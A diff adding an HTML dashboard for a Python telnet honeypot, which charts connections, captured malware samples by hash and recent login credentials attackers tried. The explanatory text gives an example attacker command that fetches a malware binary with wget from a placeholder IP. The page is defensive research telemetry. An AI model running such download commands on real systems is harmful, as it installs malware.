@@ -1,0 +1,182 @@
+<html>
+<head>
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.4.0/Chart.bundle.min.js"></script>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0-rc.2/angular.min.js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/angular.chartjs/latest/angular-chart.min.js"></script>
+<script type="text/javascript" src="https://nack.duckdns.org/backend.php"></script>
+
+<script>
+angular.module('stats', ["chart.js"])
+.controller('statController', function($scope) {
+	$scope.samples     = [];
+	$scope.threshold   = 0.02;
+	$scope.activeIndex = -1;
+
+	$scope.processData = function(data) {
+		var list   = [];
+		var count  = 0;
+		var others = 0;
+
+		for (var i = 0; i < data.length; i++) {
+			count += data[i]["count"];
+		}
+
+		for (var i = 0; i < data.length; i++) {
+			if (data[i]["count"] >= $scope.threshold * count) {
+				list.push(data[i]);
+			} else {
+				others += data[i]["count"];
+			}
+		}
+
+		list.push({ "name": "Other", "count": others });
+		$scope.samples = list;
+	};
+
+	$scope.processData(data);
+
+	$scope.labels = $scope.samples.map(function (s) {return s["name"]});
+	$scope.data   = $scope.samples.map(function (s) {return s["count"]});
+}).controller('histController', function($scope) {
+	$scope.history = hist;
+	$scope.series  = ["Urls", "Connections"];
+	$scope.labels  = $scope.history.map(function (s) {
+		if (((s["date"] / 3600) - 1) % 4 == 0) {
+			return new Date(s["date"] * 1000).getHours() + ":00";
+		} else {
+			return "";
+		}
+	});
+	$scope.data    = [ $scope.history.map(function (s) { return s["count_url"]}) ,
+		$scope.history.map(function (s) { return s["count"]}) ];
+}).controller('basicController', function($scope) {
+	$scope.conns   = base.connections;
+	$scope.urls    = base.urls;
+	$scope.samples = base.samples;
+
+	$scope.latestSamples = samples;
+	$scope.latestUrls    = urls;
+	$scope.latestConns   = conns;
+
+	$scope.formatDate = function(date) {
+		d = new Date(date * 1000);
+		return d.toTimeString().replace(/.*(\d{2}:\d{2}:\d{2}).*/, "$1");
+	}; 
+});
+</script>
+</head>
+<body ng-app="stats">
+<div class="container">
+	<h1>Python telnet honeypot statistics</h1>
+	<p>Visit us at <code>telnet://nack.duckdns.org</code></p>
+	<div class="row">
+		<div class="col-md-6 col-xs-12" ng-controller="basicController">
+			<h3>Basic Statistics</h3>
+			<p>
+				Samples and urls are collected when an URL is provided in
+				the telnet Session by typing something like
+				<code>wget http://1.2.3.4/malware.bin</code>. The file
+				will be downloaded if the URL is not already known and
+				hashed, so that duplicates can be identified. All files
+				are also uploaded to <a href="https://virustotal.com" target="_blank">virustotal.com</a>.
+			</p>
+			<table class="table">
+				<tr><td>Total Connections:</td><td>{{ conns }}</td></tr>
+				<tr><td>Total Urls:</td><td>{{ urls }}</td></tr>
+				<tr><td>Total Samples:</td><td>{{ samples }}</td></tr>
+			</table>
+		</div>
+		<div class="col-md-6 col-xs-12" ng-controller="histController">
+			<h3>Connection history per hour</h3>
+			<canvas id="doughnut" class="chart chart-line" chart-data="data" chart-labels="labels" chart-series="series"></canvas> 
+			<p>
+				Succesful connections to the telnet server. A successful
+				connection is defined by logging in with username and password.
+				No further execution of commands is needed.
+			</p>
+		</div>
+	</div>
+	<div class="row" ng-controller="statController">
+		<div class="col-md-12 col-xs-12">
+			<h3>Sample distribution by connection count</h3>
+			<p>
+				Counting every connection which tried to download a sample.
+				Connections downloading multiple samples will be counted
+				multiple times. Also may not display the malware distribution
+				by sample correctly, because many connections will actually download
+				nothing because they cannot provide a binary with matching
+				processor architecture.
+			</p>
+		</div>
+		<div class="col-md-4 col-xs-12">
+			<canvas id="doughnut" class="chart chart-doughnut" chart-data="data" chart-labels="labels">
+			</canvas> 
+		</div>
+		<div class="col-md-8 col-xs-12">
+			<table class="table table-condensed" style="font-size: 10pt;">
+				<tr><th>Count</th><th>Name</th><th>SHA256</th></tr>
+				<tr ng-repeat="s in samples">
+					<td>{{ s.count }}</td>
+					<td>{{ s.name }}</td>
+					<td><a target="_blank" href="https://www.virustotal.com/latest-scan/{{s.sha256}}">{{ s.sha256 }}</a></td>
+				</tr>
+			</table>
+		</div>
+	</div>
+	<div class="row" ng-controller="basicController">
+		<div class="col-md-7 col-xs-12">
+			<h3>Latest Samples</h3>
+			<table class="table table-condensed" style="font-size: 10pt;">
+				<tr><th>Time</th><th>Name</th><th>SHA256</th></tr>
+				<tr ng-repeat="s in latestSamples">
+					<td>{{ formatDate(s.date) }}</td>
+					<td>{{ s.name }}</td>
+					<td><a target="_blank" href="https://www.virustotal.com/latest-scan/{{s.sha256}}">{{ s.sha256 }}</a></td>
+				</tr>
+			</table>
+		</div>
+
+		<div class="col-md-5 col-xs-12">
+			<h3>Latest Connections</h3>
+			<table class="table table-condensed" style="font-size: 10pt;">
+				<tr><th>Time</th><th>IP</th><th>Username</th><th>Password</th></tr>
+				<tr ng-repeat="s in latestConns">
+					<td>{{ formatDate(s.date) }}</td>
+					<td>{{ s.ip }}</td>
+					<td>{{ s.user }}</td>
+					<td>{{ s.pass }}</td>
+				</tr>
+			</table>
+		</div>
+
+		<!--
+		<div class="col-md-5 col-xs-12">
+			<h3>Latest URLS</h3>
+			<table class="table table-condensed" style="font-size: 10pt;">
+				<tr><th>Date</th><th>URL</th></tr>
+				<tr ng-repeat="s in latestUrls">
+					<td>{{ formatDate(s.date) }}</td>
+					<td>{{ s.url }}</td>
+				</tr>
+			</table>
+		</div>
+		-->
+
+	</div>
+</div>
+
+<!-- Footer -->
+<div class="container-fluid" style="background-color: #eee; border-top: 1px solid #ddd;">
+	<div style="padding: 0; margin: 0; line-height: 3;">
+		
+
+		<span style="unicode-bidi: bidi-override; direction: rtl;">moc [TOD] liamg [TA] rentiej.p :tcatnoC</span>
+	</div>
+</div>
+</div>
+</body>
+</html>
